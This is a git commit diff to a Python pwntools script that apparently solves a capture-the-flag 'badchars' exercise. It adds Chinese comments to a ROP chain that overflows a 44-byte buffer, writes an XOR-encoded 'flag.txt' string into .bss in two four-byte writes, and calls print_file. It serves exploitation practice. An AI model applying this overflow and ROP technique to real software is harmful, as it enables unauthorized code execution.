3b97d2b3ee1f120947e57e2b8338ac4a173f176a
soupy <noobiestwong@gmail.com>
2025-07-31 22:18:47 +0800

    Update badchar_x86.py

--- badchar_x86.py
+++ badchar_x86.py
@@ -10,23 +10,26 @@ pop_ebx_esi_edi_ebp = 0x080485b8
 mov_edi_esi = 0x0804854c # 0x0804854c : pop ebp ; add bl, al ; mov dword ptr [edi], esi ; ret
 
 print_file = 0x080483d0
-raw = b"flag.txt"
-enc = bytes([b ^ xor_key for b in raw])
+raw = b"flag.txt" # 需要的字串
+enc = bytes([b ^ xor_key for b in raw]) # 加密后的字串
 print(enc)
 bss = 0x804a020
 
+# 因爲x86 一次只能寫四個bytes, 因此分兩次完成
 first_dword = u32(enc[:4])
 second_dword = u32(enc[4:8])
 
 payload = flat(
     "A"*44,
+    # 第一次
     pop_ebx_esi_edi_ebp,
     0x0,
-    first_dword,
+    first_dword, # 寫入
     bss,
     0x0,
     mov_edi_esi, 
     0x0, # pop ebp
+    # 第二次
     pop_ebx_esi_edi_ebp,
     0x0,
     second_dword,
